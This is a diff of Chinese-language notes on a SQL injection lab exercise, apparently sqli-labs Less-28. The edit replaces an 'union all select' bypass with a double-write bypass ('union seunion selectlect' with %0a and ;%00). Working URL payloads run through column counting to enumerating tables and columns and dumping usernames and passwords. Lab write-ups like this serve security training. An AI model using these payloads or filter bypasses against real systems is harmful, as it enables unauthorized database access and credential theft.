@@ -5,67 +5,49 @@
 $id= preg_replace('/[\/\*]/',"", $id);              // strip /*
 $id= preg_replace('/[--]/',"", $id);                 // --
 $id= preg_replace('/[#]/',"", $id);                  // #
-$id= preg_replace('/[ +]/',"", $id);                 // 空格和+
-$id= preg_replace('/[ +]/',"", $id);                 // 又来一次
-$id= preg_replace('/union\s+select/i',"", $id);     // ★ 只拦 union 空格 select
+$id= preg_replace('/[ +]/',"", $id);                 // 空格和+（两次）
+$id= preg_replace('/[ +]/',"", $id);
+$id= preg_replace('/union\s+select/i',"", $id);     // ★ 只拦 union<空白>select
 ```
 
-和 Less-27 最大的区别：这里只拦 `union\s+select` 这个词组，不是单独拦 `union` 和 `select`
+和 Less-27 三处不同：过滤的是 `union\s+select` 词组而不是单独的 union/select；加了 `/i`；括号闭合 `('$id')`。没报错。
 
-`select` 单独能用，`union` 单独也能用，但不能写在一起中间有空白
+空格 `[ +]` 只拦空格和加号 → `%0a` 能用。注释全禁 → `;%00` 截断。
 
-但问题是：
+## 绕过 union\s+select
 
-```
-union select       → 被删（中间有空格）
-union%0aselect     → %0a 是 \s，也被删
-union ALL select   → 中间有 ALL，不匹配 \s+，安全
-union/**/select    → /* / * 被 [\/\*] 干掉，变成 unionselect，不行
-```
-
-所以绕过方法就是往中间插个词打断匹配
-
-SQL 语句是 `('$id')`，括号闭合：
+不是插 all，是**双写**：
 
 ```
-id=('-1') union all select 1,2,3 or '1'='1' LIMIT 0,1
+union seunion selectlect
+  ↑______↑ 这一块是 union se… 不匹配 union\s+select
+
+union seunion selectlect
+        ^^^^^^^^^^^^^^^ 这一块：union<换行>select → 匹配！被删
 ```
+
+删完后：`se` + `lect` = `select`。前面还有一个 `union` 留着。
+
+所以 `union %0ase union %0aselect lect` → 过滤后 → `union select`
 
 ## order by
 
 ```
-?id=1')%0aorder%0aby%0a3%0aor%0a'1'='1
-?id=1')%0aorder%0aby%0a4%0aor%0a'1'='1
+?id=1')%0aorder%0aby%0a3;%00
+?id=1')%0aorder%0aby%0a4;%00
 ```
 
 ## 回显位
 
 ```
-?id=-1')%0aunion%0aall%0aselect%0a1,2,3%0aor%0a'1'='1
+?id=0')%0aunion%0aseunion%0aselectlect%0a1,2,3;%00
 ```
-
-## 爆库名
-
-```
-?id=-1')%0aunion%0aall%0aselect%0a1,database(),3%0aor%0a'1'='1
-```
-
-## 爆表名
-
-```
-?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0aor%0a'1'='1
-```
-
-## 爆列名
-
-```
-?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users'%0aor%0a'1'='1
-```
-
+![](99_Attachments/图片/Less-28/file-20260615202037192.png)
 ## 爆数据
 
 ```
-?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(username,0x3a,password),3%0afrom%0ausers%0aor%0a'1'='1
+?id=0')%0aunion%0aseunion%0aselectlect%0a1,group_concat(username,':',password),3%0afrom%0ausers;%00
 ```
+![](99_Attachments/图片/Less-28/file-20260615202054267.png)
 
-总结：`union\s+select` 只拦两个关键字中间带空白的情况，插个 `ALL` 进去就断了。注意 `union%0aselect` 不行——`%0a` 属于 `\s`，反而会被匹配到。用 `union%0aall%0aselect` 就没事。没有报错回显但数据正常时出结果。
+总结：`union\s+select` 词组过滤看到 `union 换行 select` 就删，那就多给一份让它删——`union seunion selectlect` 删完后正好剩 `union select`。
